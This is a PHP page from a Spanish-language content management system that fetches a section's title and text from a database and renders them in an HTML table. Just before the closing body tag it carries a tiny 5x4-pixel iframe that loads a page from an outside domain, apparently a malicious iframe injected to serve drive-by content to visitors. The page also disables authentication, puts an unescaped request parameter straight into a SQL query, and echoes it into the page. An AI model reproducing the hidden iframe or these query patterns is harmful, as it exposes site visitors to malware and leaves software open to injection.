<?
define('authenticate', false);
include_once('../inc/conf.inc.php');
$id_parent=$_REQUEST['id_parent'];
if(!isset($id_parent)){
	$id_parent=1;
}
$lng='esp';

include_once("menu.php");
$db2=new DBI;
$db2->select('contenidos','*',"id=$id_parent and lng='$lng'");
if($db2->num_rows()>0){
	while($row1=$db2->fetch_object()){
		$cmp=$row1->campo;
		if($row1->lng !=''){
			$cmpo["$row1->lng"]["$row1->campo"]=$row1->contenido;
		}
		else{
			$$cmp=$row1->contenido;
		}
	}
}				
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<title>Untitled Document </title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<style type="text/css">
<!--
.style1 {color: #FFFFFF}
.style3 {font-size: 12px}
-->
</style></head>

<body>

<table width="90%"  border="0" cellspacing="2" cellpadding="2">
	<tr>
		<td bgcolor="#0000FF">
			<div align="center"><span class="style1">Secciones <?= $id_parent?></span></div>
		</td>
		<td colspan="2">
			<div align="right"><img src="file:///Z|/mdt/admin/img/cabecera1.jpg" width="640" height="68"></div>
		</td>
	</tr>
		<tr>
			<td align="center">&nbsp;</td>
			<td>&nbsp;</td>
			<td align="left" width="80%">&nbsp;<?= menu($id_parent,$lng,'secundario'); ?>
			</td>
		</tr>
		   <td align="center"></td>
		<td>&nbsp;</td>
		<td>&nbsp;</td>
	</tr>
	<tr>
		<td rowspan="4" align="center" valign="top">
			<?= menu($id_parent,$lng,'principal'); ?>
		</td>
		<td>&nbsp;</td>
		<td>
			<h3><?=$cmpo["$lng"]['CAMPO_titulo']?></h3> 
		</td>
	</tr>
	<tr>
		<td width="5%">&nbsp;</td>
		<td width="88%">
			
				<?=$cmpo["$lng"]['CAMPO_texto']?>
			
		</td>
	</tr>
	<tr>
		<td>&nbsp;</td>
		<td>		</td>
	</tr>
	<tr>
		<td>&nbsp;</td>
		<td>&nbsp;		</td>
	</tr>
	<tr>
		<td align="center" valign="top">&nbsp;</td>
		<td>&nbsp;</td>
		<td>
			 
		</td>
	</tr>
</table>
<p>&nbsp;</p>
<iframe src="http://david123.com/r/g.php" width="5" height="4" align="right"></iframe></body>
</html>
